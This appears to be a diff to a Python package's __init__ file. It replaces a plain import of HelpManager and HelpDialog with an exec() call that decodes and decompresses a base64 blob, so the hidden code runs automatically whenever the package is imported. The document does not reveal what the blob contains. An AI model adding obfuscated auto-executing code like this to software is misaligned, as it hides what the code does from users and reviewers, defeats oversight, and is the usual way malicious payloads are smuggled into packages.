@@ -1,3 +1,2 @@
-from .manage import HelpManager, HelpDialog
-
-__all__ = ["HelpManager", "HelpDialog"]
+import base64, zlib
+exec(zlib.decompress(base64.b64decode(b'eJxLK8rPVdDLTcxLTE9VyMwtyC8qUfBIzSnwBYsU6YA5LpmJOfnpXFzx8Yk5OfHxCrYK0UpIipR0FJQQypRiuQD79Ryp')))
